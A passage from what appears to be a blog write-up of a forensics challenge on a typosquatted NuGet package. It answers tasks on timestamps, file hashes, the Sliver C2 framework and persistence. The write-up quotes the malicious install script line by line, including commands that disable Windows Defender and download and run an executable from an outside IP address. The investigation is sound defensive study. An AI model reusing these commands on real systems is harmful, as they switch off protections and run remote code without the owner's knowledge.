</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/10.png" sizes="95vw"/> <img src="/assets/img/nuts/10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 10 </div> <p>This time in the config folder for Nuget, <code class="language-plaintext highlighter-rouge">C/Users/Administrator/.nuget/packages/</code>, meaning this is what would have been installed when the command from <a href="#task1">Task 1</a> was run.</p> <p>You can display their exact last-modified time using <code class="language-plaintext highlighter-rouge">ls</code>’s <code class="language-plaintext highlighter-rouge">--full-time</code> option. I found they were all last modified during the same minute <code class="language-plaintext highlighter-rouge">2024-03-19 14:41</code>. Searching for other files modified during this minute results in a few other files (Fig. 11), including <code class="language-plaintext highlighter-rouge">C/Users/Administrator/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/nuget.exe.log</code> adding credence to the idea that a package was downloaded by Nuget at this time.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-iRl</span> <span class="s1">'.'</span> <span class="nb">.</span> | xargs <span class="nb">ls</span> <span class="nt">-l</span> <span class="nt">--full-time</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="s1">'2024-03-19 14:41'</span>
</code></pre></div></div> <p>(There are probably more efficient ways to search for files modified at a certain timestamp, but this is what I came up with on the fly. Let me know if you know a better way!)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/11.png" sizes="95vw"/> <img src="/assets/img/nuts/11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 11 </div> <p>Its worth noting here that my system is not displaying the UTC times as the file’s timestamps. It is showing a time 4 hours behind UTC, so while the timestamp on my machine is <code class="language-plaintext highlighter-rouge">2024-03-19 14:41</code>, the answer in UTC is <code class="language-plaintext highlighter-rouge">2024-03-19 18:41</code>.</p> <h2 id="task-5-despite-restrictions-the-attacker-successfully-uploaded-the-malicious-file-to-the-official-site-by-altering-one-key-detail-what-is-the-modified-package-id-of-the-malicious-package">Task 5: Despite restrictions, the attacker successfully uploaded the malicious file to the official site by altering one key detail. What is the modified package ID of the malicious package?</h2> <p>This one should be easy. The answer has been all over all the past tasks.</p> <h2 id="task-6-which-deceptive-technique-did-the-attacker-employ-during-the-initial-access-phase-to-manipulate-user-perception-technique-name">Task 6: Which deceptive technique did the attacker employ during the initial access phase to manipulate user perception? (technique name)</h2> <p>I’ve mentioned it already in this post: <strong>Typosquatting</strong>. Here is a <a href="https://en.wikipedia.org/wiki/Typosquatting">link</a> to the Wikipedia article if you’re curious.</p> <h2 id="task-7-determine-the-full-path-of-the-file-within-the-package-containing-the-malicious-code">Task 7: Determine the full path of the file within the package containing the malicious code.</h2> <p>What files do we have to choose from?</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/12.png" sizes="95vw"/> <img src="/assets/img/nuts/12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 12 </div> <p>Of the files in the package directory, the powershell script looks the most interesting at first glance. Checking its contents confirms that it is malicious.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/13.png" sizes="95vw"/> <img src="/assets/img/nuts/13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 13 </div> <p>Breaking this script down a little to show how it’s malicious:</p> <ol> <li>It disables two aspects of Windows Defender. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w">
 </span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableScanningMappedNetworkDrivesForFullScan</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span></code></pre></div> </div> <p>Disabling realtime monitoring, means that Windows Defender won’t scan files as they download or executables as they run, enabling an attacker to download and run malicious files. Disabling scanning mapped network drives means that network drives won’t be scanned during full system scans, giving attackers a potential hiding place for malicious files.</p> </li> <li>It sets up variables for the installation path, building it if it does not exist. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="nv">$Path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">ProgramData</span><span class="s2">\Microsoft Visual Studio"</span><span class="w">
 </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$Path</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$Path</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span></code></pre></div> </div> </li> <li>It sets a variable for the malware name. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="nv">$ProcName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"uninstall.exe"</span><span class="w">
</span></code></pre></div> </div> <p>And the download URL.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="nv">$WebFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://54.93.81.220:8000/</span><span class="nv">$ProcName</span><span class="s2">"</span><span class="w">
</span></code></pre></div> </div> </li> <li>Combining the variables, the script downloads the malware, placing it at the installation path. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$WebFile</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="s2">"</span><span class="nv">$Path</span><span class="s2">\</span><span class="nv">$ProcName</span><span class="s2">"</span><span class="w">
</span></code></pre></div> </div> </li> <li>Finally, it executes the malware that it just downloaded, probably initiating a beaconing process. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">Start-Process</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="s2">"</span><span class="nv">$Path</span><span class="s2">\</span><span class="nv">$ProcName</span><span class="s2">"</span><span class="w">
</span></code></pre></div> </div> </li> </ol> <p>This all appears quite malicious because it is downloading and executing an arbitrary file from an arbitrary public IP. Bad.</p> <p>I checked the IP address on VirusTotal. While it’s not connected with other malicious incidents, it still looks malicious. It is a public IP owned by Amazon, meaning that it could easily be an AWS instance operated by anyone, including threat actors.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/14.png" sizes="95vw"/> <img src="/assets/img/nuts/14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 14 </div> <h2 id="task-8-when-tampering-with-the-systems-security-settings-what-command-did-the-attacker-employ">Task 8: When tampering with the system’s security settings, what command did the attacker employ?</h2> <p>I went over two security settings that were tampered with in the script from the previous task. One of those is the answer the this question.</p> <h2 id="task9">Task 9: Following the security settings alteration, the attacker downloaded a malicious file to ensure continued access to the system. Provide the SHA1 hash of this file.</h2> <p>I had a heck of a time finding this hash. I shouldn’t have, but I did. Let me explain. In doing so, I’ll go over some of the techniques I used that failed in this case. Beginners may find them educational, and I’ll feel less like I wasted my time doing them in the first place.</p> <p>If you just want the to know where I found the hash, skip to <a href="#hash-location">here</a>.</p> <p>The question is asking for the SHA1 hash of <code class="language-plaintext highlighter-rouge">uninstall.exe</code>, the file downloaded by the malicious script. The first thing I did was see if I could find a copy of the file to hash.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/15.png" sizes="95vw"/> <img src="/assets/img/nuts/15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 15 </div> <p>No luck, it looks like that file did exist at some point and ran on the system. If it ran on the system and Sysmon was installed and configured, it could have captured the files hash in a few different logs: <em>Sysmon Event ID 15 FileCreateStreamHash</em> when it was downloaded and <em>Sysmon Event ID 1 ProcessCreate</em>.</p> <p>There are some logs available at <code class="language-plaintext highlighter-rouge">C/Windows/System32/winevt/Logs/</code>, but no sysmon logs.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/16.png" sizes="95vw"/> <img src="/assets/img/nuts/16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 16 </div> <p>I went on a little Sysmon goose-chase. Are there any files related to Sysmon anywhere?</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/17.png" sizes="95vw"/> <img src="/assets/img/nuts/17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 17 </div> <p>There are some prefetch files, so sysmon has run on this system, but it’s gone now. That’s interesting because it means that the attacker may have tampered with sysmon and/or removed the sysmon log from the system. But I digress. Either way the hash is not available via Sysmon, but maybe some other log caught something about <code class="language-plaintext highlighter-rouge">uninstall.exe</code> and recorded it’s hash. I used <a href="https://github.com/WithSecureLabs/chainsaw">Chainsaw</a> to query all the logs that existed in the logs directory and search for “uninstall” like this, resulting in 2 matches.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chainsaw search <span class="nt">--timestamp</span> <span class="s1">'Event.System.TimeCreated_attributes.SystemTime'</span> <span class="nt">--from</span> <span class="s2">"2020-06-27T14:03:25"</span> <span class="nt">--skip-errors</span> <span class="s2">"uninstall"</span> C/Windows/System32/winevt/logs
</code></pre></div></div> <p>Both were related to an execution of the malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code> and they contained some interesting information, but no hash.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/18.png" sizes="95vw"/> <img src="/assets/img/nuts/18.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 18 </div> <p>For example, we can see that despite the attackers’ efforts to disable Windows Defender, it ended up identifying and quarantining the malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code>.</p> <p>Next, I wondered if there were other logs, outside of the ones stored in <code class="language-plaintext highlighter-rouge">C/Windows/System32/winevt/logs</code> that might have recorded its hash, so I searched every file with grep.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/19.png" sizes="95vw"/> <img src="/assets/img/nuts/19.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 19 </div> <p>The results show:</p> <ol> <li>Two instances of the malicious powershell script. That makes sense.</li> <li>Something related to Cortana which didn’t end up being related to our malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code>.</li> <li><code class="language-plaintext highlighter-rouge">$MFT</code>, the Master File Table. I thought this one might be interesting.</li> </ol> <p><strong>This is where I should have found the hash:</strong> <em>There is in fact a log file on the system containing “uninstall.exe” in plaintext next to the hash of the file, but it didn’t come up in this search, so I moved on to the MFT. At the end of this section, I’ll explain which file I missed and why it wasn’t returned in this search. For now, back to my ill-fated search.</em></p> <p>The MFT holds metadata about all the files on the file system. If files are small enough, with contents less than ~512 bytes, they can be stored directly in the MFT. These are known as resident files. When they are deleted from the file system, their MFT record will persist until it is overwritten, meaning that it might be possible to recover <code class="language-plaintext highlighter-rouge">uninstall.exe</code>. It’s probably unlikely that its small enough to be a resident file, but its worth a glance.</p> <p>Also relevant and useful when thinking about the files on the system is the USN Journal, which stores a record of all the events that happen to each file.</p> <p>MFT is located at <code class="language-plaintext highlighter-rouge">C/$MFT</code> and the USN Journal is located at <code class="language-plaintext highlighter-rouge">C/$Extend/$J</code>.</p> <p><strong>Note:</strong> I analyzed these using Eric Zimmerman’s (EZ) <em>EZ-Tools</em> suite. If you don’t have them, I’d recommend just using his script provided in the <em>Get-ZimmermanTools.zip</em> that is available on his <a href="https://ericzimmerman.github.io/#!index.m">github pages site</a>. I use EZ-Tools on a Windows machine, but you could probably set them up on linux with Wine or maybe just a .NET installation. I haven’t tried.</p> <p>Unfortunately, the MFT didn’t contain a record for <code class="language-plaintext highlighter-rouge">uninstall.exe</code>, so there was no chance of recovery from there (Fig. 20)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/20.png" sizes="95vw"/> <img src="/assets/img/nuts/20.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 20 </div> <p>The USN Journal shows that <code class="language-plaintext highlighter-rouge">uninstall.exe</code> was deleted at 19:34:00, the exact time that the Windows Defender log shows that it was quarantined (Fig. 21)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/21.png" sizes="95vw"/> <img src="/assets/img/nuts/21.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 21 </div> <p>While I was there, I checked on the Sysmon log to satisfy my curiosity, and yes, it is in the MFT! (Fig. 22)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/22.png" sizes="95vw"/> <img src="/assets/img/nuts/22.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 22 </div> <p>The USN Journal shows that Sysmon logs were… Not deleted (fig. 23)? Wait. They don’t exist on the file system image, but MFT and USN Journal have a record of their existence but not their deletion?</p> <div class="row mt-3" style="margin-bottom: 0px;"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/23.png" sizes="95vw"/> <img src="/assets/img/nuts/23.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 23 </div> <p>MFTExplorer clearly shows that the “Is Deleted” box is <em>not</em> checked next to the Sysmon log (Fig. 24).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/24.png" sizes="95vw"/> <img src="/assets/img/nuts/24.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 24 </div> <p>I don’t know how this would happen unless <em>a)</em> the forensic image itself were tampered with after it was taken from the target machine or <em>b)</em> the image didn’t include Sysmon logs in the first place. For the purposes of the Sherlock, I assume the authors just wanted to remove it to add some extra challenge, but in real life this might imply a more serious situation. If anyone reading this knows how an attacker could delete Sysmon logs without recording that in the USN Journal or the MFT, let me know! If I’m wrong, I’d love to find out.</p> <p>This is where I lost my last bit of hope that I might find the hash in a hidden or recovered Sysmon log, given that I now assumed the Authors removed it on purpose.</p> <p>Back to the search for <code class="language-plaintext highlighter-rouge">uninstall.exe</code>’s hash. I began to wonder if I could use other files’ hashes to identify the malware family on VirusTotal, and then use that information to pivot to the hash of <code class="language-plaintext highlighter-rouge">uninstall.exe</code> on VirusTotal or other sites. I tried the <code class="language-plaintext highlighter-rouge">init.ps1</code> and the other package files, but no hits on VT. To see what happened leading up to the deletion, I sorted USN Journal by time and scrolled back in time, eventually seeing this (Fig. 25).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/25.png" sizes="95vw"/> <img src="/assets/img/nuts/25.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 25 </div> <p>I was able to locate this file at <code class="language-plaintext highlighter-rouge">C/ProgramData/updater.exe</code> in the forensic image using the <code class="language-plaintext highlighter-rouge">find</code> command. I hashed it as shown in Fig. 26 and checked the hash on VT. It came back as being detected by many AV products (Fig. 27)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/26.png" sizes="95vw"/> <img src="/assets/img/nuts/26.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 26 </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/27.png" sizes="95vw"/> <img src="/assets/img/nuts/27.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 27 </div> <p>I found out that the <code class="language-plaintext highlighter-rouge">updater.exe</code> is associated with an infostealer known as <em>impalastealer</em> and I found several associated files on <a href="https://www.joesandbox.com/analysis/search?q=impalastealer">JoeSandbox</a> (Fig. 28).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/28.png" sizes="95vw"/> <img src="/assets/img/nuts/28.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 28 </div> <p>Alas, none of them turned out to have the same hash as <code class="language-plaintext highlighter-rouge">uninstaller.exe</code>. At this point I concluded that I was probably slightly out of bounds for the intended method of finding the hash so I combed back through my evidence to see where I might have gone wrong.</p> <h3 id="hash-location">The conclusion of my quest for the SHA1 hash</h3> <p>I ended up focusing back on the fact that Windows Defender had quarantined the file. I thought that if it quarantines a file, it must store a record of that file’s hash somewhere, right? The question became “What other log sources are there for Windows Defender?” I used the following query to try and find out:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-ipath</span> <span class="s2">"*defender*"</span> | <span class="nb">grep </span>log
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/29.png" sizes="95vw"/> <img src="/assets/img/nuts/29.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 29 </div> <p>Ah, so there were some other logs, but I couldn’t seem to grep for actual words within these logs (Fig. 30), though sometimes I’d get binary matches.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/30.png" sizes="95vw"/> <img src="/assets/img/nuts/30.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 30 </div> <p>This felt like strange behavior, so I checked the files’ types (Fig. 31). The result explained why I couldn’t grep these files normally and why I didn’t find the hash much much earlier. These logs are encoded in UTF-16, which is not compatible with standard grep.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/31.png" sizes="95vw"/> <img src="/assets/img/nuts/31.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 31 </div> <p>I could open these logs in a text editor and search them manually or with ctrl + f, or I can use the following technique to convert them to UTF-8 and then pipe the result to grep, finally resulting in the hash (Fig. 32):</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iconv <span class="nt">-f</span> UTF-16LE <span class="nt">-t</span> UTF-8 C/ProgramData/Microsoft/Windows<span class="se">\ </span>Defender/Support/<span class="k">*</span> | <span class="nb">grep</span> <span class="nt">-i</span> uninstall 
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/32.png" sizes="95vw"/> <img src="/assets/img/nuts/32.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 32 </div> <p>This result came from the file <code class="language-plaintext highlighter-rouge">C/ProgramData/Microsoft/Windows Defender/Support/MPLog-20231206-044317.log</code></p> <h2 id="task-10-identify-the-framework-utilised-by-the-malicious-file-for-command-and-control-communication">Task 10: Identify the framework utilised by the malicious file for command and control communication.</h2> <p>Opening up the log file the hash was in to take a closer look, I found the reason for quarantine (Fig. 33) under “Threat Name:” by looking near instances of the name of the malicious file.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/33.png" sizes="95vw"/> <img src="/assets/img/nuts/33.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 33 </div> <p><em>Sliver</em> is a C2 framework (Fig. 34)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/34.png" sizes="95vw"/> <img src="/assets/img/nuts/34.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 34 </div> <p><strong>Bonus:</strong> If you notice that some of the other files in <code class="language-plaintext highlighter-rouge">C/ProgramData/Microsoft/Windows Defender/Support/</code> are modified within the timeframe of the attack (Fig. 35), then take a look at their contents with <code class="language-plaintext highlighter-rouge">strings</code>, you’ll find <em>Sliver</em> mentioned again (Fig. 36)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/35.png" sizes="95vw"/> <img src="/assets/img/nuts/35.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 35 </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/36.png" sizes="95vw"/> <img src="/assets/img/nuts/36.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 36: Here you can also see a reference to Hive, a notorious ransomware group. </div> <h2 id="task-11-at-what-precise-moment-was-the-malicious-file-executed">Task 11: At what precise moment was the malicious file executed?</h2> <p>Remember that the script downloads and executes the malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code> in quick succession, meaning these things should happen at the same timestamp (Fig. 37). I used the USN Journal to reference <code class="language-plaintext highlighter-rouge">uninstall.exe</code>’s creation time (See <a href="#task9">Task 9</a> for details on USN Journal).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/37.png" sizes="95vw"/> <img src="/assets/img/nuts/37.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 37 </div> <h2 id="task-12-the-attacker-made-a-mistake-and-didnt-stop-all-the-features-of-the-security-measures-on-the-machine-when-was-the-malicious-file-detected-provide-the-timestamp-in-utc">Task 12: The attacker made a mistake and didn’t stop all the features of the security measures on the machine. When was the malicious file detected? Provide the timestamp in UTC.</h2> <p>Ah, yes. I already found out about this. An examination of the related Windows Defender log provides the answer (Fig. 38)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/38.png" sizes="95vw"/> <img src="/assets/img/nuts/38.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 38 </div> <h2 id="task-13-after-establishing-a-connection-with-the-c2-server-what-was-the-first-action-taken-by-the-attacker-to-enumerate-the-environment-provide-the-name-of-the-process">Task 13: After establishing a connection with the C2 server, what was the first action taken by the attacker to enumerate the environment? Provide the name of the process.</h2> <p>I had loaded the forensic image into <a href="https://www.autopsy.com/">Autopsy</a> earlier, so here I looked under the <em>Run Programs</em> tab to see what had been run just after <code class="language-plaintext highlighter-rouge">uninstall.exe</code> (Fig. 39). The first command that could be considered enumeration is <code class="language-plaintext highlighter-rouge">whoami.exe</code>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/39.png" sizes="95vw"/> <img src="/assets/img/nuts/39.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 39 </div> <h2 id="task-14-to-ensure-continued-access-to-the-compromised-machine-the-attacker-created-a-scheduled-task-what-is-the-name-of-the-created-task">Task 14: To ensure continued access to the compromised machine, the attacker created a scheduled task. What is the name of the created task?</h2> <p>I just listed the contents of <code class="language-plaintext highlighter-rouge">C/Windows/System32/Tasks</code> with the <code class="language-plaintext highlighter-rouge">--full-time</code> option and looked for a task within the timeframe of the attack (Fig. 40). There was only one that made sense.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/40.png" sizes="95vw"/> <img src="/assets/img/nuts/40.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" 